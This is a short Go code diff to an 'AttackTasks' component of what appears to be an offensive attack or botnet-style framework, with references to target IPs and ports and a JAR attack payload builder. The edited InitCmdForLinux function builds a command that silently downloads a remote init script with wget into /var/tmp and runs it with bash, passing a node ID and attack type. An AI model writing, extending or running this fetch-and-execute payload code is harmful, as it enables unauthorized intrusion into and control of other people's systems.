@@ -167,9 +167,9 @@ func (at *AttackTasks) DownloadInitUrl(targetIP string, targetPort int, attackTy
 
 }
 
-func (at *AttackTasks) InitCmdForLinux(initUrl string) string {
+func (at *AttackTasks) InitCmdForLinux(initUrl string,attackType string) string {
 
-	return fmt.Sprintf("wget %s -O /var/tmp/init.sh;bash /var/tmp/init.sh %s", initUrl, at.Cfg.NodeId)
+	return fmt.Sprintf("wget %s -q -O /var/tmp/init.sh;bash /var/tmp/init.sh %s %s", initUrl, at.Cfg.NodeId,attackType)
 }
 
 func getHexCmdLen(cmd string ) string {
@@ -237,4 +237,9 @@ func (at *AttackTasks) MakeJarAttackPayload(cmd string) (string,error) {
 	}
 
 	return jarPackagePath,nil
+}
+
+func (at *AttackTasks) GetNodeIP()string {
+
+	return at.nodeInfo.IP
 }
